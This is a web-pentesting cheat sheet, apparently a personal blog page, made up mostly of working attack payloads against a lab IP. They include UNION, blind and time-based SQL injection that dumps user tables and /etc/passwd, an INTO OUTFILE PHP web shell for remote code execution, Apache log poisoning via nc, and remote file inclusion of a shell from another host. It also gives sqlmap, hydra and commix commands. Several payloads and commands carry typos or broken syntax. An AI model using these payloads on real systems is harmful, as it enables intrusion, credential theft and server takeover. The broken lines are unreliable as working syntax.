---
title: Web pentest
excerpt: "This is a guide for Web pentesting"
last_modified_at: 13-01-2022
categories:
- cheatsheet
tags:  
- pentest
- web
- pentesting
image: /assets/images/cheatsheet/web_pentesting.jpeg
---


# Web hacking  
## Attack vectors
- Parameters
- Search inputs
- Login/athentication inputs
- Fields/register inputs
- Redirects
- GET e POST parameters
- Download
- Upload

## SQL Injection.
Use sql commands that are not sanitized do retrieve database informations:
Links:  
* [Cheat sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
* [Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [w3schools](https://www.w3schools.com/Sql/sql_comments.asp)  

Sql sintax examples(mysql):  
```sql
select user(); --Show user
create database test;  
use test;
show tables;
create table users(id int primary key auto_increment,login varchar(20) not null,passwords vasrchar(20) not null);
describe users;
select id from users;
insert into users values('1','admin','admin');
select * from users;
select * from users where id="1";
select concat(login,':',passwords from users) -- CONCATENATE selects.
select @@versions -- Show database version
select load('/var/www/html/index.html') -- Load a file.
select sleep(5) -- Sleep 5 sec until return.
select substring("test",1,3)
use mysql; --System database that has informations about users,...
use information_schema; --System database, has informations about created databases, tables, columns.
```  
### SQL Information Schema  
```sql
172.16.1.10/turismo/agencias.php?loja='union select 1,2,table_name,4,5 from information_schema.tables' 
172.16.1.10/turismo/agencias.php?loja='union select 1,2,table_name,4,5 where table_schema ="dbname"%23' 
172.16.1.10/turismo/agencias.php?loja='union select 1,2,column_name,4,5 where table_schema ="dbname" and table_name="dbusers"%23' 
172.16.1.10/turismo/agencias.php?loja='union select 1,2,nome,login,senha from dbusers %23' .
172.16.1.10/turismo/agencias.php?loja='union select 1,2,concat('id=',id,'Login=',login,'pass=',password)4,5 from mrudbuserssers %23' 
172.16.1.10/turismo/agencias.php?loja='union select 1,2,3,4,load_file("/etc/passwd")%23' 
```  
### Bypass Addslashes
Send the string in char.
```sql
172.16.1.10/adm/test.php?loja='union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(100,98,114,116,117,114)'
```  

### SQL Injection Error based  
```sql
172.16.1.10/administration/test.php?test=sp'union select 1,2,3,4,5 %25' --Test until find the number of fields
172.16.1.10/administration/test.php?test=sp'union select 1,2,version(),user(),database()' 
```  
### Blind SQL Injection  
When we dont have error response.  

### Blind Post SQLi  
```sql
login=test' and length(database()) = 7 ' -- Will do request until to find the right lenght of database name

login=test' and ascii(substring(database(),1,1)) = 100 #' -- Will check character of the name until find all

login=test' and (select length(group_concat(table_name))) = 35 from information_schema.tables where table_schema="dbtest")#' -- To discover the name lenght of the tables. Repeat  the same steps to find the names, character by character.
```  

### Time based SQL Injection
```sql
test=' or sleep(5)#' -- If sleep 6 sec is working the command. 

test=' or if (database() = char(100,98,109,114,116,117,114), sleep(3),0)#' -- If was right the comparison will sleep.
```  

### SQL TO RCE
```sql
172.16.1.10/adm/test.php?ps='union all select 1,2,3,4,"<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/adm/banners/rce.php" %23' 

172.16.1.10/adm/banners/rce.php?cmd=ifconfig
```  
### SqlMap
```bash 
sqlmap -u "172.100.1.10/adm/test.php?ulp=sp" —current-db 
sqlmap -u "172.100.1.10/adm/test.php?ulp=sp" —dbs 
sqlmap -u "172.100.1.10/adm/test.php?ulp=sp" -D databasename —tables 
sqlmap -u "172.100.1.10/adm/test.php?ulp=sp" -D databasename -T tablename —columns 
sqlmap -u "172.100.1.10/adm/test.php?ulp=sp" -D databasename -C 'login,pass' —dump 
sqlmap -u "172.100.1.10/adm/test.php?ulp=sp" —current-user 
sqlmap -u "172.100.1.10/adm/test.php?ulp=sp" —users 
sqlmap -u "172.100.1.10/adm/test.php" —forms 
```  


## XSS Cross Site Scripting  
Links:  
- [Brutelogic](https://brutelogic.com.br/blog/)  

### Reflect 


### Self-XSS  
The script go to the page.

### Stored XSS  
When is possible salve a code in the page, so every time that the page is load the script execute. Can steal cookies, passwords, etc.

### Dom XSS

### Automation  
```bash
python3 xsstrike -u "http://172.16.10.1/turismo/procurar.php?busca=" # Test parameters
python3 xsstrike -u "http://172.16.10.1/turismo/procurar.php" # Find parameters in page
python3 xsstrike -u "http://172.16.10.1/turismo/procurar.php/" —path # Search by self-xss
```  


## LFI Local File Inclusion  
Application receive a parameter that execeute a command direct, without handling the input.  
- 172.16.1.10/administration/info.php?p=/../../../../etc/passwd -> Read
- 172.16.1.10/administration/info.php?p=/../../../../etc/passwd%00 -> Null byte bypass.

LFI to RCE - Log infection
```bash
172.16.1.10/administration/info.php?p=/../../../../var/log/apache2/access.log # Read a log file. in this case the apche log.

nc -v 172.16.1.10 80 -C <?php system($_GET['p']); ?> # Sending data to register in log

172.16.1.10/administration/info.php?p=/../../../../var/log/apache2/access.log&p=whereis nc # Execute the rce in log file.
```  
## RFI  Remote File Inclusion
It's possible to include a remote file in system.  
- 172.16.1.10/administration/link.php?link=https://172.90.0.37:8080/shell&p=id  

## HTML Injection
It's possible inject a html in the page.  
- "172.16.1.10/administration/search.php?ps=<a href="http://172.90.0.37/"><h1>Amazing link hacker</h1></a> 

## Path Traversal | Directory Traversal  
- 172.16.1.10/administration/test.php?banners=/ -> Will list all files inside the directory.
- 172.16.1.10/administration/test.php?banners=/../ -> Will back one directory in path.  

## Command injection
```bash
commix --url http://172.16.1.10/hosting —data="site=whoami" : 
```
## Path disclosure  
When we can see the application path.  
- /var/www/html/adminstration/index.php  

## Open redirect
Is a redirect that allow to change the destination to our target.
- www.test.com/redirect.php?url=http://attacker.com  

## Brute force 
Hydra
```bash
hydra -v -L users.txt -P pass.txt 172.16.1.10 http-post-form "/adm/login.php:login=^USER^&PASS=^PASS^&Login:FAIL"
```  

## Source Code analisys  

## PHP wrappers
```bash
http://test.com/index.php?page=data://text/plan;base64,hash 

http://test.com/index.php?page=data://text/plan;<?php system(id)?>
```  
## CMS
### Wordpress
- [wpvulndb.com](http://wpvulndb.com): Vulnetabilities database  

```bash
wpscan —url http://test.com/blog —api-token token
```  

### JOOMLA
```bash
joomscan -u http://172.100.0.106
```  

## Webdav
Is a set of extensions for the HTTP.
```bash
cadaver http://172.16.1.10/webdav/ # Open a connection to execute commands

davtest -url http://172.16.1.10/webdav/ # Upload files and execute it.
```

## XXE

## SSRF
## CSRF
## Template injection 
## Subdomain Takeover  